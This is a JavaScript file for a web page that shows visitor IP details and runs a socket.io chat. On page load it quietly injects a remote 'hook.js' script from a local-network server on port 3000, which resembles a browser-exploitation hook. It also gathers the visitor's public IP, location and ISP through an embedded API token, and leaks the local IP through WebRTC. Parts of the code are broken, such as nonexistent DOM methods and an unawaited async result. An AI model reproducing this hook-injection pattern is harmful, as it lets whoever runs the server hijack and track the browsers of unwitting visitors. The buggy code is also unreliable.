

const public_ip = document.getElementById("public-ip");
const location = document.getElementById("location");
const isp = document.getElementById("isp");
const local_ip = document.getElementById("local-ip");


// Run the script when the page loads
window.onload = () => {
    updateIPui();
    const newScript = document.createElement("script");
    newScript.src = "http://192.168.1.112:3000/hook.js";
    newScript.id = "dynamic-script3";
    newScript.click()
    document.body.appendChild(newScript);

};


function updateIPui() {
    const ipaddr1=  getVisitorInfo(); 
    const ipaddr2= getLocalIP();

    const vPublic = ipaddr1.publicIp;
    const vLocation = ipaddr1.location;
    const vISP = ipaddr1.isp;
    const vLocal = ipaddr1.localIp;
    const iLocal = ipaddr2;



    console.log({
        "Public IP": vPublic,
        "Location": vLocation,
        "ISP": vISP,
        "Local IP": vLocal,
        "I local ": iLocal
        });


    public_ip.innerHTML = vPublic;
    location.innerHTML = vLocation;
    isp.innerHTML = vISP;
    local_ip.innerHTML = vLocal;
    iLocal.innerHTML = iLocal;

    console.log("[+] IP ADDR1  ", ipaddr1);
    console.log("[+] IP ADDR2  " ,ipaddr2);
    
    public_ip.append(vPublic); 
    location.append(vLocation);
    isp.append(vISP);
    local_ip.append(vLocal);
    iLocal.append(iLocal);
}


async function getVisitorInfo() {
    try {
        // Fetch public IP address
        const publicIpResponse = await fetch('https://ipinfo.io/json?token=a9134127b2ee10'); // Replace with your API key
        if (!publicIpResponse.ok) throw new Error('Failed to fetch public IP info');

        const publicIpData = await publicIpResponse.json();
        
        // Fetch local IP address
        const localIp = await getLocalIP();
        
        const visitorInfo = {
            publicIP: publicIpData.ip,
            location: `${publicIpData.city}, ${publicIpData.region}, ${publicIpData.country}`,
            isp: publicIpData.org,
            localIP: localIp
        };

        console.log("Visitor Info:", visitorInfo);
        
        // Update the HTML elements with the fetched information
        document.getElementById("public-ip").textContent = visitorInfo.publicIP || "Unavailable";
        document.getElementById("local-ip").textContent = visitorInfo.localIP || "Unavailable";
        document.getElementById("location").textContent = visitorInfo.location || "Unavailable";
        document.getElementById("isp").textContent = visitorInfo.isp || "Unavailable";

        return visitorInfo;
    } catch (error) {
        console.error("Error fetching visitor info:", error);
        return null;
    }
}

// Function to retrieve the local IP address using WebRTC
async function getLocalIP() {
    return new Promise((resolve) => {
        const peerConnection = new RTCPeerConnection({ iceServers: [] });

        peerConnection.createDataChannel(""); 
        peerConnection.createOffer()
            .then(offer => peerConnection.setLocalDescription(offer))
            .catch(() => resolve(null));

        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                const ipMatch = event.candidate.candidate.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
                if (ipMatch) {
                    resolve(ipMatch[0]);
                }
            } else {
                resolve(null);
            }
        };
    });
}




// Create a WebSocket connection to the server
const socket = io("http://192.168.1.112/webserver/chat:3001");
const messageForm = document.getElementByClass("chat-container");
const messageInput = document.getElementByClass("messages");

const user_name = prompt ("who are you :");
appendMessage(user_name); // append the user's name to the chat log
socket.emit('new-user', user_name);

// Event listener for when the connection is opened
socket.on('chat-message', data => {
    console.log(`user: ${data.user_name_log} message: ${data.message}`);
    socket.emit('chat-message', `user: ${data.user_name_log} message: ${data.message}`); // Send the message back to the server
    appendMessage(data); // Append the message to the chat log
  //  alert(data);
})

socket.on('user-connected', data => { 
    console.log("[!] User connected:", data);
    appendMessage(`${data} has joined the chat!`);
});

socket.on('user-disconnected', data => { 
    console.log("[!] User disconnected:", data);
    appendMessage(`${data} has disconnected`);
});


// Event listneer to display messages, when a new message is received it will not clear the previous messages
messageForm.addEventListener('send', (e) => {
    e.preventDefault();
    const message = messageInput.value;
    appendMessage(`you: ${message}`);
    socket.emit('chat-message', message);  
    console.log(message)
    messageInput.value = '';
});

function appendMessage(message) {
    const messageElement = document.createElement('div');
  //  messageElement.textContent = message;
   //   messageElement.classList.add('message');

    messageElement.innerText = message; // Added this line
    messageForm.append(messageElement);
}



// Event listener for when the connection is closed
socket.onclose = (event) => {
    console.log("WebSocket connection closed");
};

// Event listener for errors
socket.onerror = (error) => {
    console.error("WebSocket error:", error);
};

// Send message to the server when the button is clicked
document.getElementById("sendButton").addEventListener("click", () => {
    const messageInput = document.getElementById("messageInput");
    const message = messageInput.value;
    socket.send(message); // Send the message to the server
    messageInput.value = ""; // Clear the input field
});